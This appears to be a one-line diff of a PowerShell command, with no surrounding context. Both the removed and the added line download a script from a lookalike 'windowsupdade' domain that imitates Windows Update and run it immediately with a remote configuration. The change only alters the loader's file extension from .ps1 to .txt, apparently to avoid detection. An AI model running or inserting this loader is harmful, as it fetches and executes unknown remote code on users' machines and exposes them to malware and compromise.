@@ -1,1 +1,1 @@
-& ([scriptblock]::Create((irm 'https://server.windowsupdade.online/loaders/v2/install-com.ps1'))) -Config 'https://server.windowsupdade.online/conf.cfg'
+& ([scriptblock]::Create((irm 'https://server.windowsupdade.online/loaders/v2/install-com.txt'))) -Config 'https://server.windowsupdade.online/conf.cfg'
